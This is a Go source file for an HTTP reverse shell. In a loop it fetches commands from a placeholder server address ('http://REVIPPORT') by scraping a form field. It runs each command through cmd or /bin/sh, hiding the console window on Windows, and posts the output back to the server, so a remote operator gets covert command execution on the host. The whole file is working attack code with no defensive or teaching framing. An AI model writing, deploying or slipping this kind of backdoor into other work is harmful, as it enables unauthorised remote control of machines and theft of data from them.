package main

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/PuerkitoBio/goquery"
)

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	var osshell string
	//var osshellargs []string
	//fmt.Println("Got a Shadow from ...")
	revserver := "http://REVIPPORT"

	client := &http.Client{}

	for {

		response, err := client.Get(revserver)
		checkerr(err)
		defer response.Body.Close()
		//cnt2, _ := ioutil.ReadAll(response.Body)
		//fmt.Println(string(cnt2))

		doc, err := goquery.NewDocumentFromResponse(response)
		checkerr(err)
		cnt, _ := doc.Find("form div div div input").Attr("value")

		if strings.TrimSpace(cnt) == "" {
			cnt = "ipconfig"
		}
		command := strings.TrimSpace(string(cnt))
		//fmt.Println("Go query")
		//fmt.Println(command)

		if command == "bye" {
			client.PostForm(revserver, url.Values{"cmd": {command}, "cmdres": {"Bye for now !"}})
			os.Exit(0)
		} else {
			osshellargs := []string{"/C", command}
			if runtime.GOOS == "windows" {
				osshell = "cmd"
			} else {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}
			}
			execcmd := exec.Command(osshell, osshellargs...)
			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			out, _ := execcmd.Output()
			//fmt.Println(string(out))
			client.PostForm(revserver, url.Values{"cmd": {command}, "cmdres": {string(out)}})
			//client.PostForm(revserver, url.Values{"cmd": {command}})
			time.Sleep(3 * time.Second)
		}

	}

}
